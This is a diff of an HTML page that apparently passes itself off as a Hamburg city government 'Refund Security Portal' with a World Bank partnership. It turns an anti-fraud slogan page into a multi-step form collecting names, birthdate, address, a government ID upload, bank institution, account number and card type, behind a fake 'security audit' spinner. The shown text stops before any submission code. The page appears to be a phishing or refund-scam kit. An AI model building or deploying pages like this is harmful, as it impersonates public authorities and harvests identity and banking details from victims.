@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Fraud Prevention & Security</title>
+    <title>International Refund Security Portal</title>
     <style>
         :root { --hamburg-red: #E10019; --hamburg-blue: #003063; --security-gold: #FFD700; }
         
-        /* THE BACKGROUND PATTERN */
+        /* STABLE BACKGROUND PATTERN */
         body { 
-            font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 40px 20px; min-height: 100vh; 
+            font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; min-height: 100vh; 
             display: flex; flex-direction: column; align-items: center;
             background-color: #003063;
             background-image: linear-gradient(30deg, #001a36 12%, transparent 12.5%, transparent 87%, #001a36 87.5%, #001a36),
@@ -18,99 +18,104 @@
             background-size: 80px 140px;
         }
 
-        /* LIGHT & FADED OVERLAY (MAPUTI NA MAY FADE) */
+        /* FADE / GLASSMORPHISM OVERLAY */
         .form-container { 
-            background: rgba(255, 255, 255, 0.97); /* Light & Clean Color */
-            backdrop-filter: blur(15px); /* Fade / Blur Effect */
-            width: 100%; max-width: 850px; 
-            border-radius: 4px; box-shadow: 0 40px 100px rgba(0,0,0,0.7); 
-            overflow: hidden; border-top: 14px solid var(--hamburg-red); 
-            margin-top: 20px;
+            background: rgba(255, 255, 255, 0.9); /* Fade effect */
+            backdrop-filter: blur(12px); /* Blurred background */
+            width: 100%; 
+            max-width: 850px; 
+            border-radius: 4px; 
+            box-shadow: 0 40px 100px rgba(0,0,0,0.8); 
+            overflow: hidden; 
+            border-top: 12px solid var(--hamburg-red); 
+            margin-top: 20px; 
         }
 
-        .security-banner { background: var(--hamburg-blue); color: white; padding: 15px; text-align: center; font-size: 12px; font-weight: bold; text-transform: uppercase; border-bottom: 3px solid var(--security-gold); letter-spacing: 2px; }
+        .security-banner { background: var(--hamburg-blue); color: white; padding: 12px; text-align: center; font-size: 11px; font-weight: bold; text-transform: uppercase; border-bottom: 2px solid var(--security-gold); letter-spacing: 1px; }
+        .header { padding: 40px 30px; text-align: center; background: rgba(255, 255, 255, 0.95); border-bottom: 6px solid var(--hamburg-blue); }
+        .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 24px; font-weight: 900; text-transform: uppercase; }
+        .header p { margin: 10px 0 0; color: var(--hamburg-red); font-weight: 700; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; }
         
-        .header { padding: 50px 30px; text-align: center; border-bottom: 1px solid #eee; background: white; }
-        .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 26px; font-weight: 900; text-transform: uppercase; }
-        .header p { margin: 10px 0 0; color: var(--hamburg-red); font-weight: 700; font-size: 12px; text-transform: uppercase; }
-
-        /* THE LETTERS / CONTENT */
-        .content { padding: 50px 60px; }
-        .theme-section { margin-bottom: 40px; }
-        .main-title { font-size: 20px; color: var(--hamburg-blue); font-weight: 900; text-transform: uppercase; margin-bottom: 20px; display: block; border-left: 5px solid var(--hamburg-blue); padding-left: 15px; }
+        .section-box { padding: 40px; display: none; }
+        .section-box.active { display: block; }
         
-        .sub-block { margin-bottom: 20px; }
-        .label { font-size: 11px; font-weight: 800; color: var(--hamburg-red); text-transform: uppercase; display: block; margin-bottom: 5px; }
-        .text { font-size: 15px; color: #333; line-height: 1.6; margin: 0; }
-        .theme-quote { font-size: 14px; font-style: italic; font-weight: 700; color: #004085; background: #e7f3ff; padding: 10px 15px; display: inline-block; margin-top: 10px; border-radius: 4px; }
+        /* SECURITY THEMES STYLING */
+        .theme-card { background: rgba(0, 48, 99, 0.05); border-left: 5px solid var(--hamburg-blue); padding: 20px; margin-bottom: 30px; }
+        .theme-title { font-weight: 800; font-size: 14px; color: var(--hamburg-blue); text-transform: uppercase; margin-bottom: 5px; }
+        .theme-text { font-size: 13px; color: #444; line-height: 1.5; margin-bottom: 10px; }
+        .theme-quote { font-style: italic; font-weight: 700; color: var(--hamburg-red); font-size: 13px; }
 
-        .divider { height: 1px; background: #eee; margin: 30px 0; }
-        .footer { font-size: 11px; color: #666; text-align: center; padding: 40px; border-top: 1px solid #eee; background: white; }
+        h2 { font-size: 17px; color: var(--hamburg-blue); margin-bottom: 25px; font-weight: 800; text-transform: uppercase; border-bottom: 1px solid #ccc; padding-bottom: 10px; }
+        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        label { display: block; font-weight: 700; margin-bottom: 8px; font-size: 11px; color: var(--hamburg-blue); text-transform: uppercase; }
+        input, select { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 0; box-sizing: border-box; font-size: 14px; background: #fff; }
+        input.error { border: 2px solid var(--hamburg-red); background-color: #fffafa; }
+        
+        .btn-container { display: flex; justify-content: space-between; margin-top: 40px; }
+        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 18px 50px; cursor: pointer; font-size: 13px; font-weight: 800; text-transform: uppercase; transition: 0.3s; }
+        button:hover { background-color: var(--hamburg-red); transform: scale(1.02); }
+
+        #loader-container { display: none; text-align: center; padding: 20px; }
+        #loader { border: 6px solid #f3f3f3; border-top: 6px solid var(--hamburg-blue); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer { font-size: 11px; color: #333; text-align: center; padding: 35px; background: rgba(255, 255, 255, 0.95); border-top: 1px solid #eee; }
     </style>
 </head>
 <body>
-
     <div class="form-container">
-        <div class="security-banner">🛡️ Fraud Prevention & Refund Security Themes</div>
-
-        <div class="header">
-            <h1>FREIE UND HANSESTADT HAMBURG</h1>
-            <p>International Refund Security Framework</p>
-        </div>
-
-        <div class="content">
-            <!-- THEME 1 -->
-            <div class="theme-section">
-                <span class="main-title">Security & Fraud Protection</span>
-                <div class="sub-block">
-                    <span class="label">Vision</span>
-                    <p class="text">A marketplace defined by absolute security and zero-fraud tolerance.</p>
-                </div>
-                <div class="sub-block">
-                    <span class="label">Mission</span>
-                    <p class="text">To protect every transaction with rigorous verification and proactive scam prevention.</p>
-                </div>
-                <span class="theme-quote">Theme: "Secure Returns, Scam-Free Service."</span>
+        <div class="security-banner">🛡️ Secure Returns, Scam-Free Service • Verified for Your Safety</div>
+        <form id="refundForm">
+            <div class="header">
+                <h1>FREIE UND HANSESTADT HAMBURG</h1>
+                <p>World Bank Partnership • Refund Security Portal</p>
             </div>
 
-            <div class="divider"></div>
+            <!-- SECTION 1 -->
+            <div id="section1" class="section-box active">
+                <div class="theme-card">
+                    <div class="theme-title">Security & Fraud Protection</div>
+                    <div class="theme-text"><strong>Mission:</strong> To protect every transaction with rigorous verification and proactive scam prevention.</div>
+                    <div class="theme-quote">"Secure Returns, Scam-Free Service."</div>
+                </div>
 
-            <!-- THEME 2 -->
-            <div class="theme-section">
-                <span class="main-title">Verification & Trust</span>
-                <div class="sub-block">
-                    <span class="label">Vision</span>
-                    <p class="text">To be the safest platform for consumer investments and protected returns.</p>
+                <h2>Section 1: Identity & Nationality</h2>
+                <div class="input-group"><div class="grid-3">
+                    <div><label>Last Name *</label><input type="text" class="required"></div>
+                    <div><label>First Name *</label><input type="text" class="required"></div>
+                    <div><label>Middle Name *</label><input type="text" class="required"></div>
+                </div></div>
+                <div class="grid-2" style="margin-top:20px;">
+                    <div><label>Personal Email Address *</label><input type="email" class="required"></div>
+                    <div><label>Nationality *</label><input type="text" class="required"></div>
                 </div>
-                <div class="sub-block">
-                    <span class="label">Mission</span>
-                    <p class="text">Implementing multi-layer verification to ensure refunds only reach rightful owners.</p>
+                <div class="input-group" style="margin-top:20px;"><label>Residential Address *</label><input type="text" class="required"></div>
+                <div class="grid-2">
+                    <div><label>Birthdate *</label><input type="date" class="required"></div>
+                    <div><label>Contact Number *</label><input type="text" class="required"></div>
                 </div>
-                <span class="theme-quote">Theme: "Verified for Your Safety."</span>
+                <div class="input-group" style="margin-top:20px;"><label>Upload Valid Government ID *</label><input type="file" class="required"></div>
+                
+                <div class="btn-container"><span></span><button type="button" onclick="nextS()">Next Step</button></div>
             </div>
 
-            <div class="divider"></div>
-
-            <!-- THEME 3 -->
-            <div class="theme-section">
-                <span class="main-title">Vigilance & Integrity</span>
-                <div class="theme-block">
-                    <span class="label">Vision</span>
-                    <p class="text">Leading the industry in ethical commerce and fraud-resistant policies.</p>
+            <!-- SECTION 2 -->
+            <div id="section2" class="section-box">
+                <div class="theme-card">
+                    <div class="theme-title">Verification & Trust</div>
+                    <div class="theme-text"><strong>Mission:</strong> Implementing multi-layer verification to ensure refunds only reach rightful owners.</div>
+                    <div class="theme-quote">"Verified for Your Safety."</div>
                 </div>
-                <div class="theme-block">
-                    <span class="label">Mission</span>
-                    <p class="text">To educate and safeguard customers against deceptive practices during the refund process.</p>
+
+                <h2>Section 2: Security & Disbursement</h2>
+                <div class="grid-2">
+                    <div><label>Amount (EUR) *</label><input type="number" class="required" placeholder="€ 0.00"></div>
+                    <div><label>Upload Receipt *</label><input type="file" class="required"></div>
                 </div>
-                <span class="theme-quote">Theme: "Protecting Your Peace of Mind."</span>
-            </div>
-        </div>
+                <div class="input-group" style="margin-top:20px;"><label>Bank Institution Name *</label><input type="text" class="required"></div>
+                <div class="grid-2">
+                    <div><label>Account Number *</label><input type="text" class="required"></div>
+                    <div><label>Card Type *</label><select class="required"><option value="">Select...</option><option>Debit Card</option><option>Credit Card</option></select></div>
+                </div>
 
-        <div class="footer">
-            © 2024 Behörde para sa Pananalapi • Hamburg, Germany <br>
-            In Strategic Partnership with the <strong>World Bank Group</strong>
-        </div>
-    </div>
-
-</body>
-</html>
+                <div id="loader-container"><div id="loader"></div><p style="font-size: 11px; font-weight:bold; color: var(--hamburg-blue);">PERFORMING MULTI-LAYER SECURITY AUDIT...</p></div>
